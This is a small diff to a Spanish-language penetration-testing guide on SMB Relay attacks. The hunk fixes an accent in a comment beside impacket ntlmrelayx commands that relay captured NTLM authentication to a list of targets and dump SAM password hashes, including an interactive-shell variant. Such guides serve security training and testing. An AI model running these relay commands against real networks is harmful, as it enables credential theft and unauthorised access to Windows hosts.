@@ -22,7 +22,7 @@ Este ataque se basa en **capturar** y **retransmitir** solicitudes de autenticac
 
 4. Ejecutar la herramienta para aplicar el SMB Relay. Si el ataque fue exitoso, la herramienta nos mostrara los hashes de la SAM   
 ❯ impacket-ntlmrelayx -tf targets.txt -smb2support
-❯ ntlmrelayx.py -tf targets.txt -smb2support            # La version v0.9.19 es funcional 
+❯ ntlmrelayx.py -tf targets.txt -smb2support              # La versión v0.9.19 es funcional 
 	# tf = Target file  
 
 ❯ ntlmrelayx.py -tf targets.txt -smb2support -i  
